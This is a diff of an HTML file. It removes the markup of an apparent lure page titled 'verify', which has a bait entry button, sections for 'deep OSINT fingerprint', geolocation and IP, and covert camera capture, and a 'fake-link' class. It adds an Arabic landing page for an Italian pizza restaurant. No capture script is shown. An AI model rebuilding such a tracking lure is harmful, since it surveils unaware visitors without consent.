@@ -3,208 +3,1029 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحقق</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <title>لا بيتسا إيطاليانا — Authentic Italian Pizza</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Newsreader:ital,wght@0,300;0,400;0,500;1,300&family=Noto+Kufi+Arabic:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400;1,600&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        #start { background: #0f0; color: #000; border: none; padding: 20px; font-size: 20px; cursor: pointer; font-weight: bold; display: block; margin: 50px auto; }
-        #ui { display: none; margin-top: 20px; background: #111; padding: 20px; border: 1px solid #0f0; }
-        .sec { border-bottom: 1px dashed #0f0; padding: 10px 0; }
-        h3 { color: #0f0; }
-        .r { display: flex; justify-content: space-between; font-size: 14px; margin: 5px 0; }
-        .v { color: #fff; direction: ltr; text-align: left; max-width: 70%; word-break: break-all; }
-        #map { height: 200px; margin-top: 10px; display: none; }
-        #bait { margin-top: 20px; color: #fff; }
-        .fake-link { color: #0ff; text-decoration: underline; cursor: pointer; }
-        #camBox { display: none; margin-top: 20px; border: 2px solid red; }
-        #log { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.8); color: red; padding: 10px; font-size: 12px; }
+        * { font-family: 'Noto Kufi Arabic', 'Inter', sans-serif; }
+        .font-italian { font-family: 'Playfair Display', serif; }
+        .font-serif { font-family: 'Newsreader', serif; }
+
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-12px) rotate(2deg); } }
+        @keyframes steam { 0% { opacity: 0; transform: translateY(0) scaleX(1); } 50% { opacity: 0.5; transform: translateY(-18px) scaleX(1.3); } 100% { opacity: 0; transform: translateY(-36px) scaleX(0.7); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
+        @keyframes slideDown { from { opacity: 0; max-height: 0; } to { opacity: 1; max-height: 500px; } }
+        @keyframes pulse-glow { 0%, 100% { box-shadow: 0 0 20px rgba(0,149,62,0.2); } 50% { box-shadow: 0 0 40px rgba(0,149,62,0.4); } }
+        @keyframes flag-wave { 0%, 100% { transform: skewX(0deg); } 25% { transform: skewX(1deg); } 75% { transform: skewX(-1deg); } }
+        @keyframes spin-slow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes bounce-in { 0% { transform: scale(0); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }
+
+        .animate-fade-in-up { animation: fadeInUp 0.8s ease-out forwards; }
+        .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
+        .animate-float { animation: float 6s ease-in-out infinite; }
+        .animate-scale-in { animation: scaleIn 0.5s ease-out forwards; }
+        .animate-bounce-in { animation: bounce-in 0.4s ease-out forwards; }
+        .flag-wave { animation: flag-wave 3s ease-in-out infinite; }
+
+        .steam-line { animation: steam 2.2s ease-out infinite; }
+        .steam-line:nth-child(2) { animation-delay: 0.6s; }
+        .steam-line:nth-child(3) { animation-delay: 1.2s; }
+
+        .menu-card { opacity: 0; transform: translateY(30px); transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        .menu-card.visible { opacity: 1; transform: translateY(0); }
+        .menu-card:hover { transform: translateY(-8px); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+        .menu-card:hover .card-image { transform: scale(1.1); }
+        .menu-card:hover .price-tag { background: linear-gradient(135deg, #00953E, #00B140); color: #fff; }
+        .menu-card:hover .add-btn { background: linear-gradient(135deg, #00953E, #00B140); border-color: #00953E; color: #fff; }
+
+        .category-btn.active { background: linear-gradient(135deg, #00953E, #00B140); color: #fff; border-color: #00953E; }
+
+        .hero-gradient { background: linear-gradient(to left, rgba(10,10,10,0.97), rgba(10,10,10,0.75), transparent); }
+        .hero-gradient-bottom { background: linear-gradient(to top, #0a0a0a, transparent); }
+        .glow-green { background: radial-gradient(ellipse, rgba(0,149,62,0.12), transparent 70%); }
+
+        .badge-popular { background: linear-gradient(135deg, #00953E, #00B140); }
+        .badge-new { background: linear-gradient(135deg, #CE2B37, #E8364F); }
+        .badge-spicy { background: linear-gradient(135deg, #FF6B35, #FF8C42); }
+
+        .italian-stripe { background: linear-gradient(to left, #00953E 0%, #00953E 33.33%, #FFFFFF 33.33%, #FFFFFF 66.66%, #CE2B37 66.66%, #CE2B37 100%); }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #111; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #555; }
+
+        .toast { animation: fadeInUp 0.4s ease-out forwards; }
+        .toast-exit { animation: fadeOut 0.3s ease-in forwards; }
+        @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
+
+        .size-btn.selected { background: rgba(0,149,62,0.15); border-color: #00953E; color: #fff; }
+        .size-btn.selected .size-price { color: #00B140; }
+        .size-btn.selected .size-icon { color: #00B140; }
+
+        .nav-blur { backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); }
+
+        .paypal-btn { background: linear-gradient(135deg, #0070BA, #1548A0); }
+        .paypal-btn:hover { background: linear-gradient(135deg, #003087, #0070BA); }
+
+        .step-active { background: linear-gradient(135deg, #00953E, #00B140); color: #fff; }
+        .step-done { background: #00953E; color: #fff; }
+        .step-pending { background: rgba(255,255,255,0.05); color: #737373; border: 1px solid rgba(255,255,255,0.1); }
+
+        .order-success { animation: bounce-in 0.6s ease-out forwards; }
+
+        .input-field { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s; }
+        .input-field:focus { border-color: #00953E; box-shadow: 0 0 0 3px rgba(0,149,62,0.1); outline: none; }
+
+        .counter-btn { transition: all 0.2s; }
+        .counter-btn:active { transform: scale(0.9); }
     </style>
 </head>
-<body id="cap">
+<body class="bg-[#0a0a0a] text-white overflow-x-hidden">
 
-<button id="start">[ اضغط هنا للدخول ]</button>
-<div id="log">جاهز...</div>
+    <!-- Italian Flag Stripe Top -->
+    <div class="italian-stripe h-1 fixed top-0 left-0 right-0 z-[100] flag-wave"></div>
 
-<div id="ui">
-    <div class="sec"><h3>[+] DEEP OSINT FINGERPRINT</h3><div id="fp"></div></div>
-    <div class="sec"><h3>[+] GEOLOCATION & IP</h3><div id="geo"></div><div id="map"></div></div>
-    <div class="sec">
-        <h3>[+] CAMERA CAPTURE (IF ALLOWED)</h3>
-        <p style="color:#888; font-size:12px;">محاولة تشغيل الكاميرا بشكل خفي (ستفشل في المتصفحات الحديثة بدون إذن)</p>
-        <video id="camBox" autoplay width="200"></video><canvas id="camCanvas" style="display:none"></canvas>
+    <!-- Navigation -->
+    <nav class="fixed top-1 left-0 right-0 z-50 nav-blur bg-[#0a0a0a]/85 border-b border-white/5">
+        <div class="max-w-7xl mx-auto px-4 md:px-6 py-3 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="relative">
+                    <div class="w-11 h-11 rounded-full bg-gradient-to-br from-[#00953E] to-[#006B2D] flex items-center justify-center shadow-lg shadow-green-900/30">
+                        <span class="iconify text-white text-xl" data-icon="lucide:pizza"></span>
+                    </div>
+                    <div class="absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full bg-[#CE2B37] border-2 border-[#0a0a0a]"></div>
+                    <div class="absolute -top-0.5 -right-0.5 w-2.5 h-2.5 rounded-full bg-white border-2 border-[#0a0a0a]"></div>
+                </div>
+                <div>
+                    <h1 class="text-base md:text-lg font-bold tracking-tight">لا بيتسا إيطاليانا</h1>
+                    <p class="text-[9px] text-neutral-500 tracking-[0.2em] uppercase font-italian italic">Pizza Autentica Italiana</p>
+                </div>
+            </div>
+            <div class="hidden lg:flex items-center gap-8">
+                <a href="#menu" class="text-sm text-neutral-400 hover:text-[#00B140] transition-colors duration-300">المنيو</a>
+                <a href="#specials" class="text-sm text-neutral-400 hover:text-[#00B140] transition-colors duration-300">العروض</a>
+                <a href="#about" class="text-sm text-neutral-400 hover:text-[#00B140] transition-colors duration-300">قصتنا</a>
+                <a href="#contact" class="text-sm text-neutral-400 hover:text-[#00B140] transition-colors duration-300">تواصل</a>
+            </div>
+            <div class="flex items-center gap-3">
+                <button onclick="openCart()" class="relative p-2.5 rounded-full hover:bg-white/5 transition-colors">
+                    <span class="iconify text-xl text-neutral-300" data-icon="lucide:shopping-bag"></span>
+                    <span id="cart-count" class="absolute -top-0.5 -left-0.5 w-5 h-5 bg-[#CE2B37] text-white text-[10px] font-bold rounded-full flex items-center justify-center hidden">0</span>
+                </button>
+                <button onclick="document.getElementById('menu').scrollIntoView({behavior:'smooth'})" class="hidden md:flex items-center gap-2 bg-gradient-to-r from-[#00953E] to-[#00B140] hover:shadow-lg hover:shadow-green-900/30 text-white text-sm font-medium px-5 py-2.5 rounded-full transition-all duration-300">
+                    <span>اطلب الآن</span>
+                    <span class="iconify text-base" data-icon="lucide:arrow-up-left"></span>
+                </button>
+                <button onclick="toggleMobileMenu()" class="lg:hidden p-2.5 rounded-full hover:bg-white/5 transition-colors">
+                    <span class="iconify text-xl text-neutral-300" data-icon="lucide:menu"></span>
+                </button>
+            </div>
+        </div>
+        <div id="mobile-menu" class="hidden lg:hidden border-t border-white/5 bg-[#0a0a0a]/95 nav-blur">
+            <div class="px-6 py-4 flex flex-col gap-3">
+                <a href="#menu" onclick="toggleMobileMenu()" class="text-sm text-neutral-400 hover:text-[#00B140] py-2 transition-colors">المنيو</a>
+                <a href="#specials" onclick="toggleMobileMenu()" class="text-sm text-neutral-400 hover:text-[#00B140] py-2 transition-colors">العروض</a>
+                <a href="#about" onclick="toggleMobileMenu()" class="text-sm text-neutral-400 hover:text-[#00B140] py-2 transition-colors">قصتنا</a>
+                <a href="#contact" onclick="toggleMobileMenu()" class="text-sm text-neutral-400 hover:text-[#00B140] py-2 transition-colors">تواصل</a>
+                <button onclick="document.getElementById('menu').scrollIntoView({behavior:'smooth'});toggleMobileMenu()" class="flex items-center justify-center gap-2 bg-gradient-to-r from-[#00953E] to-[#00B140] text-white text-sm font-medium px-5 py-2.5 rounded-full mt-2">اطلب الآن</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="relative min-h-[100vh] flex items-center overflow-hidden">
+        <div class="absolute inset-0">
+            <img src="https://picsum.photos/seed/italian-pizza-oven-dark/1920/1080.jpg" alt="Italian Pizza" class="w-full h-full object-cover opacity-35" />
+            <div class="hero-gradient absolute inset-0"></div>
+            <div class="hero-gradient-bottom absolute inset-0"></div>
+            <div class="glow-green absolute top-1/4 right-1/4 w-96 h-96 rounded-full"></div>
+        </div>
+        <div class="absolute top-1/3 right-[12%] md:right-[18%] flex gap-3">
+            <div class="steam-line w-0.5 h-7 bg-gradient-to-t from-transparent via-white/15 to-transparent rounded-full"></div>
+            <div class="steam-line w-0.5 h-9 bg-gradient-to-t from-transparent via-white/10 to-transparent rounded-full"></div>
+            <div class="steam-line w-0.5 h-5 bg-gradient-to-t from-transparent via-white/15 to-transparent rounded-full"></div>
+        </div>
+
+        <div class="relative z-10 max-w-7xl mx-auto px-4 md:px-6 pt-28 pb-20 w-full">
+            <div class="max-w-2xl">
+                <!-- Italian Flag Badge -->
+                <div class="animate-fade-in-up flex items-center gap-3 mb-8" style="animation-delay: 0.2s;">
+                    <div class="flex h-6 rounded-full overflow-hidden shadow-lg">
+                        <div class="w-5 bg-[#00953E]"></div>
+                        <div class="w-5 bg-white"></div>
+                        <div class="w-5 bg-[#CE2B37]"></div>
+                    </div>
+                    <span class="text-xs text-neutral-400 tracking-wider">صُنعت بإتقان على الطريقة الإيطالية</span>
+                </div>
+
+                <h1 class="animate-fade-in-up text-4xl md:text-6xl lg:text-7xl font-bold leading-[1.05] tracking-tight mb-4" style="animation-delay: 0.4s;">
+                    <span class="font-italian italic text-[#00B140]">La Vera</span>
+                    <br>
+                    بيتزا إيطالية
+                    <br>
+                    <span class="text-neutral-400 text-3xl md:text-5xl lg:text-6xl font-light">أصيلة</span>
+                </h1>
+
+                <p class="animate-fade-in-up text-neutral-400 text-sm md:text-base leading-relaxed mb-10 max-w-lg" style="animation-delay: 0.6s;">
+                    عجينة تخمر 72 ساعة ب olive oil إيطالي، صلصة San Marzano DOP، وموزاريلا di Bufala_CAMPAنا طازجة. كل قطعة تحكي قصة نابولي.
+                </p>
+
+                <div class="animate-fade-in-up flex flex-wrap gap-4 mb-12" style="animation-delay: 0.8s;">
+                    <button onclick="document.getElementById('menu').scrollIntoView({behavior:'smooth'})" class="flex items-center gap-3 bg-gradient-to-r from-[#00953E] to-[#00B140] text-white text-sm font-medium px-8 py-4 rounded-full transition-all duration-300 hover:shadow-xl hover:shadow-green-900/30 group">
+                        <span>تصفح المنيو</span>
+                        <span class="iconify text-lg group-hover:-translate-x-1 group-hover:-translate-y-1 transition-transform duration-300" data-icon="lucide:arrow-down-left"></span>
+                    </button>
+                    <a href="#contact" class="flex items-center gap-3 bg-white/5 hover:bg-white/10 border border-white/10 text-white text-sm font-medium px-8 py-4 rounded-full transition-all duration-300">
+                        <span class="iconify text-lg text-[#00B140]" data-icon="lucide:phone"></span>
+                        <span>اتصل الآن</span>
+                    </a>
+                </div>
+
+                <div class="animate-fade-in-up flex flex-wrap items-center gap-6 text-sm text-neutral-500" style="animation-delay: 1s;">
+                    <div class="flex items-center gap-2">
+                        <span class="iconify text-[#00B140]" data-icon="lucide:clock"></span>
+                        <span>توصيل 35 دقيقة</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="iconify text-[#00B140]" data-icon="lucide:star"></span>
+                        <span>4.9 من 3,200+</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="iconify text-[#00B140]" data-icon="lucide:truck"></span>
+                        <span>مجاني فوق 60 ر.س</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Floating Pizza -->
+        <div class="hidden lg:block absolute left-[6%] top-1/2 -translate-y-1/2 animate-float">
+            <div class="relative">
+                <div class="w-72 h-72 rounded-full overflow-hidden border-[3px] border-white/10 shadow-2xl shadow-black/50">
+                    <img src="https://picsum.photos/seed/naples-pizza-fresh/600/600.jpg" alt="Pizza Napoletana" class="w-full h-full object-cover" />
+                </div>
+                <!-- Italian flag ring -->
+                <div class="absolute -inset-1.5 rounded-full" style="background: conic-gradient(from 0deg, #00953E 0deg 120deg, #FFFFFF 120deg 240deg, #CE2B37 240deg 360deg); -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 3px), #000 calc(100% - 3px)); mask: radial-gradient(farthest-side, transparent calc(100% - 3px), #000 calc(100% - 3px));"></div>
+                <div class="absolute -bottom-3 -right-3 bg-neutral-900/90 border border-white/10 rounded-xl px-3 py-2 backdrop-blur-md">
+                    <div class="flex items-center gap-2">
+                        <div class="flex h-4 rounded-sm overflow-hidden">
+                            <div class="w-3 bg-[#00953E]"></div>
+                            <div class="w-3 bg-white"></div>
+                            <div class="w-3 bg-[#CE2B37]"></div>
+                        </div>
+                        <span class="text-[10px] text-neutral-300">+350 طلب اليوم</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Bar -->
+    <section class="border-y border-white/5 bg-[#0d0d0d]">
+        <div class="max-w-7xl mx-auto px-6 py-6 grid grid-cols-2 md:grid-cols-4 gap-6">
+            <div class="text-center">
+                <div class="text-2xl md:text-3xl font-bold text-[#00B140] mb-1 font-italian">+60</div>
+                <div class="text-[10px] text-neutral-500 tracking-wider uppercase">نوع بيتزا</div>
+            </div>
+            <div class="text-center">
+                <div class="text-2xl md:text-3xl font-bold text-[#00B140] mb-1 font-italian">72h</div>
+                <div class="text-[10px] text-neutral-500 tracking-wider uppercase">تخمير العجينة</div>
+            </div>
+            <div class="text-center">
+                <div class="text-2xl md:text-3xl font-bold text-[#00B140] mb-1 font-italian">100%</div>
+                <div class="text-[10px] text-neutral-500 tracking-wider uppercase">مكونات إيطالية</div>
+            </div>
+            <div class="text-center">
+                <div class="text-2xl md:text-3xl font-bold text-[#00B140] mb-1 font-italian">2018</div>
+                <div class="text-[10px] text-neutral-500 tracking-wider uppercase">منذ سنة التأسيس</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="py-20 md:py-24 border-b border-white/5">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="grid lg:grid-cols-2 gap-12 items-center">
+                <div class="relative">
+                    <div class="rounded-3xl overflow-hidden border border-white/10 aspect-[4/3]">
+                        <img src="https://picsum.photos/seed/italian-chef-pizza-making/800/600.jpg" alt="Italian Chef" class="w-full h-full object-cover opacity-70" />
+                    </div>
+                    <div class="absolute -bottom-6 -left-6 bg-neutral-900 border border-white/10 rounded-2xl p-5 backdrop-blur-md">
+                        <div class="flex items-center gap-4">
+                            <div class="flex h-8 rounded-full overflow-hidden shadow">
+                                <div class="w-6 bg-[#00953E]"></div>
+                                <div class="w-6 bg-white"></div>
+                                <div class="w-6 bg-[#CE2B37]"></div>
+                            </div>
+                            <div>
+                                <div class="text-xs font-bold">شيف ماركو روسي</div>
+                                <div class="text-[10px] text-neutral-500">خبرة 20 عام في نابولي</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="flex h-5 rounded-full overflow-hidden">
+                            <div class="w-4 bg-[#00953E]"></div>
+                            <div class="w-4 bg-white"></div>
+                            <div class="w-4 bg-[#CE2B37]"></div>
+                        </div>
+                        <span class="text-xs text-neutral-500 tracking-wider uppercase">La Nostra Storia</span>
+                    </div>
+                    <h2 class="text-3xl md:text-4xl font-bold tracking-tight mb-6">قصة <span class="text-[#00B140] font-italian italic">إيطاليا</span> في كل قطعة</h2>
+                    <p class="text-neutral-400 text-sm leading-relaxed mb-4">
+                        بدأت رحلتنا في 2018 عندما قرر شيف ماركو روسي أن يجلب طعم نابولي الحقيقي إلى المملكة. كل بيتزا لدينا محضّرة بعجينة تخمر لمدة 72 ساعة، ممدودة باليد، ومخبوزة في فرن حجري على درجة 450° مئوية لـ 90 ثانية فقط.
+                    </p>
+                    <p class="text-neutral-400 text-sm leading-relaxed mb-8">
+                        نستورد مكوناتنا مباشرة من إيطاليا: طماطم San Marzano DOP من منطقة كامبانيا، زيت زيتون بكر ممتاز من توسكانا، وموزاريلا di Bufala طازجة يومياً.
+                    </p>
+                    <div class="grid grid-cols-3 gap-4">
+                        <div class="text-center p-4 rounded-2xl bg-white/5 border border-white/5">
+                            <span class="iconify text-2xl text-[#00B140] mx-auto mb-2" data-icon="lucide:award"></span>
+                            <div class="text-[10px] text-neutral-500">معتمد AVPN</div>
+                        </div>
+                        <div class="text-center p-4 rounded-2xl bg-white/5 border border-white/5">
+                            <span class="iconify text-2xl text-[#00B140] mx-auto mb-2" data-icon="lucide:flame"></span>
+                            <div class="text-[10px] text-neutral-500">فرن حجري</div>
+                        </div>
+                        <div class="text-center p-4 rounded-2xl bg-white/5 border border-white/5">
+                            <span class="iconify text-2xl text-[#00B140] mx-auto mb-2" data-icon="lucide:leaf"></span>
+                            <div class="text-[10px] text-neutral-500">DOP مكونات</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Menu Section -->
+    <section id="menu" class="py-24 md:py-32 relative">
+        <div class="glow-green absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[400px] rounded-full opacity-20"></div>
+        <div class="relative z-10 max-w-7xl mx-auto px-4 md:px-6">
+            <div class="text-center mb-14">
+                <div class="flex items-center justify-center gap-3 mb-4">
+                    <div class="flex h-5 rounded-full overflow-hidden">
+                        <div class="w-4 bg-[#00953E]"></div>
+                        <div class="w-4 bg-white"></div>
+                        <div class="w-4 bg-[#CE2B37]"></div>
+                    </div>
+                    <span class="text-xs text-neutral-500 tracking-wider uppercase">Il Nostro Menu</span>
+                    <div class="flex h-5 rounded-full overflow-hidden">
+                        <div class="w-4 bg-[#00953E]"></div>
+                        <div class="w-4 bg-white"></div>
+                        <div class="w-4 bg-[#CE2B37]"></div>
+                    </div>
+                </div>
+                <h2 class="text-3xl md:text-5xl font-bold tracking-tight mb-3">قائمة <span class="text-[#00B140] font-italian italic">البيتزا</span></h2>
+                <p class="text-neutral-400 max-w-md mx-auto text-sm">كل وصفة أصلية من إيطاليا، محضّرة بحب وشغف</p>
+            </div>
+
+            <div class="flex flex-wrap justify-center gap-2 mb-12">
+                <button onclick="filterMenu('all')" class="category-btn active px-5 py-2 rounded-full text-xs border border-white/10 transition-all duration-300" data-cat="all">الكل</button>
+                <button onclick="filterMenu('classiche')" class="category-btn px-5 py-2 rounded-full text-xs border border-white/10 text-neutral-400 transition-all duration-300" data-cat="classiche">كلاسيكية Classiche</button>
+                <button onclick="filterMenu('speciali')" class="category-btn px-5 py-2 rounded-full text-xs border border-white/10 text-neutral-400 transition-all duration-300" data-cat="speciali">مميزة Speciali</button>
+                <button onclick="filterMenu('gourmet')" class="category-btn px-5 py-2 rounded-full text-xs border border-white/10 text-neutral-400 transition-all duration-300" data-cat="gourmet">جورميه Gourmet</button>
+                <button onclick="filterMenu('sides')" class="category-btn px-5 py-2 rounded-full text-xs border border-white/10 text-neutral-400 transition-all duration-300" data-cat="sides">إضافات Sides</button>
+            </div>
+
+            <div id="menu-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5"></div>
+        </div>
+    </section>
+
+    <!-- Specials -->
+    <section id="specials" class="py-24 md:py-28 border-t border-white/5">
+        <div class="max-w-7xl mx-auto px-4 md:px-6">
+            <div class="text-center mb-14">
+                <span class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-[#00953E]/10 border border-[#00953E]/20 text-xs text-[#00B140] tracking-wider mb-4">
+                    <span class="iconify" data-icon="lucide:sparkles"></span>
+                    Offerte Speciali — عروض خاصة
+                </span>
+                <h2 class="text-3xl md:text-5xl font-bold tracking-tight">عروض <span class="text-[#00B140] font-italian italic">الأسبوع</span></h2>
+            </div>
+            <div class="grid md:grid-cols-2 gap-5">
+                <div class="relative overflow-hidden rounded-3xl border border-white/10 bg-gradient-to-br from-[#00953E]/10 to-neutral-900 group hover:border-[#00953E]/30 transition-all duration-500">
+                    <div class="absolute top-0 left-0 right-0 h-1 italian-stripe"></div>
+                    <div class="p-7 md:p-9 flex flex-col md:flex-row gap-7 items-center">
+                        <div class="w-36 h-36 rounded-2xl overflow-hidden flex-shrink-0">
+                            <img src="https://picsum.photos/seed/family-italian-pizza/400/400.jpg" alt="عائلي" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700" />
+                        </div>
+                        <div class="flex-1 text-center md:text-right">
+                            <div class="inline-block badge-popular text-white text-[10px] font-bold px-3 py-1 rounded-full mb-3">وفر 35%</div>
+                            <h3 class="text-lg font-bold mb-1 font-italian">La Famiglia</h3>
+                            <p class="text-neutral-400 text-xs mb-4">بيتزا كبيرة + بيتزا وسط + 4 مشروبات + 2 تيراميسو</p>
+                            <div class="flex items-center justify-center md:justify-start gap-3">
+                                <span class="text-2xl font-bold text-[#00B140]">129 ر.س</span>
+                                <span class="text-neutral-500 line-through text-xs">199 ر.س</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="relative overflow-hidden rounded-3xl border border-white/10 bg-gradient-to-br from-[#CE2B37]/10 to-neutral-900 group hover:border-[#CE2B37]/30 transition-all duration-500">
+                    <div class="absolute top-0 left-0 right-0 h-1 italian-stripe"></div>
+                    <div class="p-7 md:p-9 flex flex-col md:flex-row gap-7 items-center">
+                        <div class="w-36 h-36 rounded-2xl overflow-hidden flex-shrink-0">
+                            <img src="https://picsum.photos/seed/couple-pizza-deal/400/400.jpg" alt="ثنائي" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700" />
+                        </div>
+                        <div class="flex-1 text-center md:text-right">
+                            <div class="inline-block badge-new text-white text-[10px] font-bold px-3 py-1 rounded-full mb-3">عرض جديد</div>
+                            <h3 class="text-lg font-bold mb-1 font-italian">Il Duo Perfetto</h3>
+                            <p class="text-neutral-400 text-xs mb-4">بيتزا وسط + أجنحة دجاج 8 قطع + مشروبين + بريدي</p>
+                            <div class="flex items-center justify-center md:justify-start gap-3">
+                                <span class="text-2xl font-bold text-[#00B140]">79 ر.س</span>
+                                <span class="text-neutral-500 line-through text-xs">110 ر.س</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact -->
+    <section id="contact" class="py-24 md:py-28 border-t border-white/5">
+        <div class="max-w-7xl mx-auto px-4 md:px-6">
+            <div class="grid lg:grid-cols-2 gap-14">
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="flex h-5 rounded-full overflow-hidden"><div class="w-4 bg-[#00953E]"></div><div class="w-4 bg-white"></div><div class="w-4 bg-[#CE2B37]"></div></div>
+                        <span class="text-xs text-neutral-500 tracking-wider uppercase">Contattaci</span>
+                    </div>
+                    <h2 class="text-3xl md:text-4xl font-bold tracking-tight mb-6">تواصل <span class="text-[#00B140] font-italian italic">معنا</span></h2>
+                    <p class="text-neutral-400 text-sm leading-relaxed mb-10">نرحب بك دائماً! اتصل بنا أو زرنا لتحظى بتجربة إيطالية حقيقية.</p>
+                    <div class="space-y-5">
+                        <div class="flex items-center gap-4">
+                            <div class="w-11 h-11 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0"><span class="iconify text-lg text-[#00B140]" data-icon="lucide:phone"></span></div>
+                            <div><div class="text-[10px] text-neutral-500 mb-0.5">اتصل بنا</div><div class="text-sm font-medium" dir="ltr">+966 50 123 4567</div></div>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <div class="w-11 h-11 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0"><span class="iconify text-lg text-[#00B140]" data-icon="lucide:map-pin"></span></div>
+                            <div><div class="text-[10px] text-neutral-500 mb-0.5">العنوان</div><div class="text-sm font-medium">شارع الأمير سلطان، حي الروضة، جدة</div></div>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <div class="w-11 h-11 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0"><span class="iconify text-lg text-[#00B140]" data-icon="lucide:clock"></span></div>
+                            <div><div class="text-[10px] text-neutral-500 mb-0.5">ساعات العمل</div><div class="text-sm font-medium">يومياً 12:00 ظهراً — 2:00 صباحاً</div></div>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <div class="w-11 h-11 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0"><span class="iconify text-lg text-[#00B140]" data-icon="lucide:message-circle"></span></div>
+                            <div><div class="text-[10px] text-neutral-500 mb-0.5">واتساب</div><div class="text-sm font-medium" dir="ltr">+966 50 123 4567</div></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="relative">
+                    <div class="rounded-3xl overflow-hidden border border-white/10 h-full min-h-[380px]">
+                        <img src="https://picsum.photos/seed/italian-restaurant-interior-warm/800/600.jpg" alt="المطعم" class="w-full h-full object-cover opacity-55" />
+                        <div class="absolute inset-0 bg-gradient-to-t from-[#0a0a0a] via-transparent to-transparent"></div>
+                        <div class="absolute bottom-0 left-0 right-0 p-7">
+                            <div class="flex items-center gap-3 mb-3">
+                                <div class="flex gap-0.5">
+                                    <span class="iconify text-yellow-500 text-sm" data-icon="lucide:star"></span>
+                                    <span class="iconify text-yellow-500 text-sm" data-icon="lucide:star"></span>
+                                    <span class="iconify text-yellow-500 text-sm" data-icon="lucide:star"></span>
+                                    <span class="iconify text-yellow-500 text-sm" data-icon="lucide:star"></span>
+                                    <span class="iconify text-yellow-500 text-sm" data-icon="lucide:star"></span>
+                                </div>
+                                <span class="text-xs text-neutral-300">4.9 من 3,247 تقييم على جوجل</span>
+                            </div>
+                            <p class="text-neutral-400 text-xs italic font-serif leading-relaxed">"أقرب شيء لبيتزا نابولي الحقيقية خارج إيطاليا! العجينة رقيقة ومنفوخة والـ cornicione مثالي. Grazie mille!"</p>
+                            <p class="text-[10px] text-neutral-600 mt-2">— أحمد م، جدة</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="border-t border-white/5 py-10">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 rounded-full bg-gradient-to-br from-[#00953E] to-[#006B2D] flex items-center justify-center"><span class="iconify text-white text-xs" data-icon="lucide:pizza"></span></div>
+                    <span class="text-sm font-bold">لا بيتسا إيطاليانا</span>
+                    <div class="flex h-4 rounded-full overflow-hidden"><div class="w-3 bg-[#00953E]"></div><div class="w-3 bg-white"></div><div class="w-3 bg-[#CE2B37]"></div></div>
+                </div>
+                <div class="flex items-center gap-4">
